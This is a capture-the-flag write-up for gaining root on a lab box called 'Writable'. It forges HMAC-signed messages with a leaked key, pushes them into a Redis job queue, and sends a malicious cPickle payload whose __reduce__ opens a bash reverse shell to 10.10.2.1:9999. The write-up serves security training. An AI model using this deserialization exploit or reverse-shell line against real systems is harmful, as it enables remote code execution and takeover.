# Writable (root)

Continuing on from our shell session, we need to have a quick look at
`/opt/pyexec.py`, which is mentioned on the glances panel.

Source can be read <a href=""https://github.com/CovHackSoc/CTFChallenges/blob/master/boxes/writable/pyexec/pyexec.py>here</a>

This mentions a file called `./etc/jobs.json`, which contains:
```
{
    "host":"127.0.0.1",
    "port":6379,
    "key":"d32afd00b2c4bc74ac2e2548f97bc89c6df6fd3785f7125a67a933bdf6904d01",
    "password":"redis_is_really_secure",
    "queue":"jobs"
}
```

(Minor note, as the script is running from `/`, the `.` in the path can be
ignored)

So, we now need to use this to forge a signed message which can be done like so:

```
import base64
import hmac
key = "d32afd00b2c4bc74ac2e2548f97bc89c6df6fd3785f7125a67a933bdf6904d01"
payload = "BLAH"
data = base64.b64encode(payload)
mac = hmac.new(key.decode('hex'), data).hexdigest()

message = ",".join([data,mac])
```

Talking to redis can be done with:
```
import redis
connection = redis.Redis(
    host='10.10.2.6',
    port=6379,
    password='redis_is_really_secure'
)

connection.rpush('jobs', message)
```

Now, what do we set the payload to? Looking though the `evaluate_job()` function
we see references to pysandbox and cPickle. cPickle is known to be easier to
exploit, so we'll go with that. (Exploiting pysandbox is probably possible, but
I haven't attempted it)

Exploiting cPickle requires us to construct a class with a `__reduce__` method,
serialize it and then send it over.

This can be done like so:
```
import cPickle
import subprocess

class RunBinSh(object):
  def __reduce__(self):
    return (subprocess.Popen, (('/bin/bash','-c','bash -i >& /dev/tcp/10.10.2.1/9999 0>&1'),))

payload = cPickle.dumps(RunBinSh())
```

Running this will give us reverse shell that connects back to `10.10.2.1:9999`.

A full exploit can be found here [1].

Reading `/root/root.txt` gives us:
```
CTF{pysandbox_is_still_broken}
```

# References
* [1] https://github.com/CovHackSoc/CTFChallenges/blob/master/boxes/writable/solutions/client.py
